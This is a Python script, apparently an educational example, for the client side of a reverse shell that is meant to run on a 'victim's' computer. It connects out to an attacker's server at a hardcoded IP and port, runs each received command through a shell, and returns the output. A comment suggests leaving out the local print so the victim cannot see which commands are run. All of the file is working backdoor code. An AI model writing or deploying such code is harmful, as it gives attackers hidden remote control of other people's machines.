# Client file will run on client/victim's computer
# Functions:-
# 1. It will try to connect to server and wait for commands
# 2. Recieve the commands and execute them on victim's computer
# 3. Return output to server(attacker)

import socket # module help us to create sockets that act as end-point for 2-way communication between 2 processes over a network
import os # module that helps to execute instructions recieved from server,it provides functions for interacting with OS
import subprocess # module that helps to spawn new processes and attach to their input,output and error pipeline
import sys  # helps us to execute terminal commands

s=socket.socket() # it will create a socket for outgoing connection from victim's machine

host="192.168.29.157"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
port=9999  # it will store port number on which server is listening

s.connect((host,port)) # it requests a connection from victim's socket to the specified socket(host,port) passed as arguement which belongs to server
					   # this request is accepted by s.accept() function at server's end and 3-way hanshake mechanism is initiated
					   # A socket is opened at an ephemeral port on victim machine that is a random port number between 49153-65535 assigned by OS 

while True:  # An infinite loop to execute multiple commands recieved from server
	data=s.recv(20480) # recieving data in form of bytes from server(1024 B chunk)

	if data[:2].decode("utf-8") == "cd":   # handling for cd command which dont generate output and just switches between directories
		path=data[3:].decode("utf-8")      # new directory path
		os.chdir(path)                     # change current working directory

	if len(data) > 0:    # to check whether any data has been entered by attacker or not
		
		cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,
								stdin=subprocess.PIPE,stderr=subprocess.PIPE)   
																   # subprocess.Popen() creates a new child process
																   # if shell=True then it selects command prompt(shell) as program to execute commands	and also help us to execute shell commands
																   # if we only want to run batch file or executable then shell=False works but if we want to execute shell commands such as (copy or dir) then shell=True must be pecified
																   # command passed as arguement is then executed on the shell
																   # stdout,str=din,stderr are standard ouput,input and error to newly created process
																   # subprocess.PIPE reprsents a new pipeline for child process to be created

		output_byte=cmd.stdout.read() + cmd.stderr.read()    # output of command executed in form of bytes

		output_string=str(output_byte,"utf-8")   # output string conatining output of executed command that is to be sent back to server(attacker)
        
		current_dir=os.getcwd() + "> "        # we will also send current working directory to the server for reflecting changes for cd commands
	    
		s.send(str.encode(output_string+current_dir))        # output string along with current working directory needs to be encoded for transmission

		print(output_string+current_dir)                 # printing output on client/victim- can be omitted for attacking purpose if we dont want victim to know of commands we are executing
             
		cmd.terminate()                      # terminating child process after each command